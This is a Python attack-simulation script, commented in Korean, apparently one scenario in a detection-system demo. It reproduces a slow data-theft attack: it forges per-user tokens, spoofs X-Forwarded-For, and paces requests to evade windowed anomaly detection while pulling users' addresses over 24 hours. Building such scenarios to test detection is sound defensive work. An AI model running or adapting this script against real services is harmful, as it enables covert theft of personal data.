"""
S6 — Slow & Low (쿠팡 7개월 미탐지 재현).

행위:
- 단일 IP에서 분당 1~2건 페이스로 sleep
- sub는 랜덤 셔플 → 순차 패턴도 숨김
- 24시간 가동 → 약 2,000명 데이터 확보

기대 탐지:
- 첫 1시간: 5분 윈도우 미달, 모든 신호 0점
- t=01:00: 1시간 윈도우 의심 단계 (70)
- t=24:00: 24시간 윈도우 override 100 + 누적유출량 z-score 폭증
- MTTD 목표: 수 시간 ~ 24h
"""
import os
import sys
import time
import random
import argparse
from pathlib import Path

from dotenv import load_dotenv

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))

from lib.token_forge import forge_token
from lib.target_pool import get_shuffled_pool
from lib.http_client import get_session, call_api

load_dotenv(_ROOT / ".env")


def run_s6(
    duration_hours: float = 24.0,
    min_interval: float = 30.0,
    max_interval: float = 60.0,
):
    """
    Parameters
    ----------
    duration_hours : 공격 지속 시간 (시간 단위, 발표용 6h 압축 가능)
    min_interval : 요청 간 최소 간격 (초)
    max_interval : 요청 간 최대 간격 (초)
    """
    session = get_session()
    pool = get_shuffled_pool()
    pool_idx = 0

    # XFF 위조용 source IP (S4와 다른 IP로 두면 동시 시연 시 분리 집계됨)
    src_ip = os.environ.get("S6_SOURCE_IP")

    start_time = time.time()
    end_time = start_time + duration_hours * 3600
    request_count = 0
    success_count = 0

    print(
        f"[S6] 시작 — duration={duration_hours}h, "
        f"interval={min_interval}~{max_interval}s"
    )
    print(f"[S6] target pool: {len(pool)}명 (shuffled)")
    print(f"[S6] X-Forwarded-For: {src_ip or '(미위조)'}")

    try:
        while time.time() < end_time:
            if pool_idx >= len(pool):
                print(f"[S6] pool 소진 ({pool_idx}명) — 종료")
                break

            victim_id = pool[pool_idx]
            token = forge_token(victim_id)

            try:
                resp = call_api(session, f"/api/addresses/{victim_id}", token, src_ip=src_ip)
                request_count += 1
                if resp.status_code == 200:
                    success_count += 1

                if request_count % 30 == 0:
                    elapsed_h = (time.time() - start_time) / 3600
                    print(
                        f"[S6] t={elapsed_h:.2f}h  req={request_count}  "
                        f"ok={success_count}  sub={victim_id}"
                    )

            except Exception as e:
                print(f"[S6] error sub={victim_id}: {e}")

            pool_idx += 1
            # 분당 1~2건 — 5분 윈도우 z-score 미달 페이스
            time.sleep(random.uniform(min_interval, max_interval))
    except KeyboardInterrupt:
        print(f"\n[S6] 사용자 중단")

    print(
        f"[S6] 종료 — 총 {request_count} 요청, {success_count} 성공, "
        f"{pool_idx}명 점진 유출"
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--duration", type=float, default=24.0, help="공격 지속 시간 (시간)")
    parser.add_argument("--min-interval", type=float, default=30.0, help="요청 간 최소 간격 (초)")
    parser.add_argument("--max-interval", type=float, default=60.0, help="요청 간 최대 간격 (초)")
    args = parser.parse_args()
    run_s6(args.duration, args.min_interval, args.max_interval)
